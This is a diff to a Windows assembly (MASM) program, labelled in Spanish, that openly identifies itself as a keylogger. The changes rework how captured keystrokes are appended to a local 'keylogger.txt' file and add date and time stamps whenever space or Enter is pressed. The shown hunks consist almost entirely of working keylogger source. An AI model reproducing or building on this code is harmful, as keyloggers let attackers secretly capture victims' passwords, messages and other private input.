@@ -17,43 +17,28 @@ WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
 	directorio		byte "keylogger.txt",NULL
 	error1			db "No se pudo crear el archivo",0
 	inicio			db "Keylogger iniciado", 10, 0
-	continuacion	db "Presione una tecla para continaur", 10, 0
-	slash			dw "/",NULL
-	puntos			dw ":",NULL
-
-	sysTime			SYSTEMTIME <>
-	org sysTime
-	wYear			dw 0
-	wMonth			dw 0
-	wToDay			dw 0 ; Sunday 0 to Saturday 6
-	wDay			dw 0
-	wHour			dw 0
-	wMinute			dw 0
-	wSecond			dw 0
-	wKsecond		dw 0
-	date_buf		db 50 dup (32)
-	time_buf		db 20 dup (32)
-	dateformat		db " dddd, MMMM, dd, yyyy", 0
-					db 0
-	timeformat		db "hh:mm:ss tt", 0
+	formatofecha db " dd/MM/yyyy ",0
+	formatohora db " hh:mm:ss ",0
+	;continuacion	db "Presione una tecla para continaur", 10, 0
 
 .data?
-	fecha			dd ?
+fechaBuf db 50 dup(?)
+	horaBuf db 50 dup(?)
 	manejo			dd ?
 	key				dd ?
 	bytesw			dd ?
-	cadenaFinal		db ?
 .code
 program:
 	CALL main
 	main PROC
 
 		INVOKE				StdOut, ADDR inicio
-		INVOKE				StdOut, ADDR continuacion
+		;INVOKE				StdOut, ADDR continuacion
 
 		MOV					edx, OFFSET directorio
 		
-		INVOKE				CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
+		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
+		INVOKE SetFilePointer, eax, 0, 0, FILE_END
 		MOV					manejo, EAX
 		CMP					EAX, INVALID_HANDLE_VALUE
 		JE					fin_programa
@@ -64,15 +49,22 @@ program:
 			MOV				key, EAX
 			CMP				EAX, 0
 			JE				seguir
+		    INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
+		    mov manejo, eax
+		    INVOKE SetFilePointer, manejo, 0, 0, FILE_END
+		    INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
+		    mov eax, manejo
+		    INVOKE CloseHandle, eax
+
 
 		verificacion:
 
-			MOV				EBX, key						;moviendo la entrada a la variable "key"
-			CMP				EBX, 0ah						;si es un espacio
-			JZ				EscribirFecha
-			CMP				EBX, 13							;si es un ENTER
-			JZ				EscribirFecha
-			JMP				seguir							;de lo contrario, sigue leyendo teclado
+	    mov ebx, key						
+		cmp ebx, 20h						
+		jz EscribirFecha
+		cmp ebx,  0dh						
+		jz EscribirFecha
+		jmp keylogger			
 
 		seguir:
 			JMP				keylogger
@@ -81,7 +73,7 @@ program:
 		fin_programa:
 			INVOKE			ExitProcess, 0
 
-		EscribirClave:
+			
 			INVOKE			CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
 			MOV				manejo, EAX
 			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
@@ -91,13 +83,19 @@ program:
 			JMP				verificacion
 
 		EscribirFecha:
-			INVOKE			GetSystemTime, addr sysTime
-			INVOKE			CreateFile, ADDR directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
-			MOV				manejo, EAX
-			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
-			INVOKE			WriteFile, manejo, addr sysTime, 1, ADDR bytesw, NULL
-			MOV				EAX, manejo
-			INVOKE			CloseHandle, EAX
+		   INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
+		mov manejo, eax
+		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
+
+		invoke GetDateFormat, 0,0, \
+		0, addr formatofecha, addr fechaBuf, 50
+		invoke GetTimeFormat, 0, 0, \
+		0, addr formatohora, addr horaBuf, 50
+
+		INVOKE WriteFile,manejo,addr fechaBuf,11,addr bytesw,NULL
+		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL
+
+		invoke CloseHandle, manejo
 			JMP				seguir
 
 	main ENDP
